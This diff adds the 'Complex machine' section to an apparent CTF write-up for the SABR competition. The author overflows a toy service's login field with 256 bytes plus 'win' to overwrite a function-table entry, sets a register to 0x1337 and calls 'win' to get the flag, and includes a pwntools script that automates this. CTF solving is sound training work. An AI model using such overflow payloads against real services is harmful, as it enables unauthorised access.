@@ -458,8 +458,305 @@ io.close()
 ```
 
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/simplemachine/scriptresult.png)
+
 Flag: sabr{S1MPL3_STACK_M4CH1N3}
 
 ### Complex machine:
 ![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/1.png)
+
+So we’re given a remote service to connect to also lets check it out and note from the description is that we should call either win or flag function.
+
+On connecting to it we see just like the previous simple machine cli but this time it has more commands that can be run.
+
+```
+┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/misc/complexmachine]
+└─$ nc 13.36.37.184 9092
+
+ ▄▄████████▄ ▄███▄   ▄▄███ ▄▄████████▄ ▄▄████████▄ ▄███   ▄███ ▄█████████ ▄███   ▄███ ▄▄█████████
+ ████▀▀▀████ ██████▄██████ ████▀▀▀████ ████▀▀▀████ ████   ████ ▀▀▀████▀▀▀ █████▄ ████ ████▀▀▀▀▀▀▀
+ ████   ▀▀▀▀ ████▀███▀████ ████▄▄▄████ ████   ▀▀▀▀ ████▄▄▄████    ████    ███████████ ████▄▄▄    
+ ████   ▄▄▄▄ ████ ▀▀▀ ████ ████▀▀▀████ ████   ▄▄▄▄ ████▀▀▀████    ████    ████▀▀█████ ████▀▀▀    
+ ████▄▄▄████ ████     ████ ████   ████ ████▄▄▄████ ████   ████ ▄▄▄████▄▄▄ ████  ▀████ ████▄▄▄▄▄▄▄
+ ▀█████████▀ ████     ████ ████   ████ ▀█████████▀ ████   ████ ██████████ ████   ████ ▀██████████
+  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀     ▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀
+                                                                                                 
+ Welcome to the Complex Machine. Type help or ? to list operations.
+
+
+#> help
+
+Documented commands (type help <topic>):
+========================================
+add  call       help  login  mul  readstr  store  xor
+and  functions  load  mem    or   regs     sub  
+
+#> 
+```
+
+Now lets check the registers present using the regs command
+
+```
+#> regs
+x0 = 0x0000
+x1 = 0x0000
+x2 = 0x0000
+x3 = 0x0000
+x4 = 0x0000
+x5 = 0x0000
+x6 = 0x0000
+x7 = 0x0000
+x8 = 0x0000
+x9 = 0x0000
+#> 
+```
+
+They are all set to zero but also we have a command called functions lets see what functions we have stored.
+
+```
+
+#> functions
+Available Functions: 
+        echo
+        strreverse
+        randstring
+        strtohex
+#> 
+```
+
+Cool we have the functions present.
+
+We have other commands to check lets check out the mem command
+
+```
+#> mem
+00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000100: 65 63 68 6F 00 00 00 00  00 00 00 00 00 00 00 00  echo............
+00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
+00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
+00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
+00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+#> 
+```
+
+From the result we can see that this is the memory address in which the functions are stored.
+
+Lets check the command login and we need to pass an argument which is the password
+
+```
+#> login hacker
+Invalid password: hacker !
+#> login gimmeflag
+Invalid password: gimmeflag !
+#> 
+```
+
+Now lets check the memory address back
+
+```
+#> mem
+00000000: 67 69 6D 6D 65 66 6C 61  67 00 00 00 00 00 00 00  gimmeflag.......
+00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000000F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000100: 65 63 68 6F 00 00 00 00  00 00 00 00 00 00 00 00  echo............
+00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
+00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
+00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
+00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+#> 
+```
+
+We see that the login command argument we passed is been stored in the memory address
+
+At this point what i then did was to overwrite any real function and replace with win.
+
+How can this be achieved ?
+
+Well by passing in junkdata +win
+
+So I did that on my terminal to create a's' ("a"*256 + "win"), how i knew to use a*256 was be calculating the amount of bytes needed to reach the win function in the memory address' 
+
+```                                                                                                        
+┌──(mark㉿haxor)-[~/…/CTF/Sabr/misc/complexmachine]
+└─$ python2 -c 'print"a"*256+"win"'
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin                                                                           
+```
+
+Now using that as the argument to login 
+
+```
+#> login aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin
+Invalid password: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaawin !
+#> 
+```
+
+Now on checking the memory address we see that the echo function has been overwritten by win
+
+```
+#> mem
+00000000: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000010: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000020: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000030: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000040: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000050: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000060: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000070: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000080: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000090: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+000000A0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+000000B0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+000000C0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+000000D0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+000000E0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+000000F0: 61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+00000100: 77 69 6E 00 00 00 00 00  00 00 00 00 00 00 00 00  win.............
+00000110: 73 74 72 72 65 76 65 72  73 65 00 00 00 00 00 00  strreverse......
+00000120: 72 61 6E 64 73 74 72 69  6E 67 00 00 00 00 00 00  randstring......
+00000130: 73 74 72 74 6F 68 65 78  00 00 00 00 00 00 00 00  strtohex........
+00000140: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000150: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000160: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000170: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000180: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+00000190: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001C0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001D0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001E0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+000001F0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
+#> 
+```
+
+We can confirm by checking the available functions using the function command
+
+```
+#> functions
+Available Functions: 
+        win
+        strreverse
+        randstring
+        strtohex
+#> 
+```
+
+Now lets try calling the win function 
+
+And there’s a command that can call any function stored in the memory address `call`
+
+```
+#> call win
+Invalid Argument!
+#> 
+```
+
+But we get invalid argument. 
+
+From this I remembered the previous machine required changing the value of any register to 0x1337 and calling the win command so i tried that here also
+
+```
+#> xor x0 4919
+#> regs
+x0 = 0x1337
+x1 = 0x0000
+x2 = 0x0000
+x3 = 0x0000
+x4 = 0x0000
+x5 = 0x0000
+x6 = 0x0000
+x7 = 0x0000
+x8 = 0x0000
+x9 = 0x0000
+#> 
+```
+
+Now lets call the win function again
+
+```
+#> call win
+You Win, Flag is sabr{0x7563_is_TOO_Large_for_this_Machine}
+```
+
+And I got the flag.
+
+Here’s my python script i used to solve it
+
+It might take few seconds for it to print the flag
+
+```
+#/usr/bin/python2
+
+from pwn import *
+io = remote('13.36.37.184',9092)
+bytes = 'a'*256
+
+#sending the required param
+io.sendline("xor x0 4919")
+
+#over write the echo function
+io.sendline("login "+bytes+"win")
+io.sendline("regs")
+io.sendline("call win")
+io.send("\n")
+
+#making the output interactive
+io.interactive()
+io.close()
+```
+
+![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/misc/complexmachine/scriptresult.png)
+
+Flag: sabr{0x7563_is_TOO_Large_for_this_Machine}
+
+
 
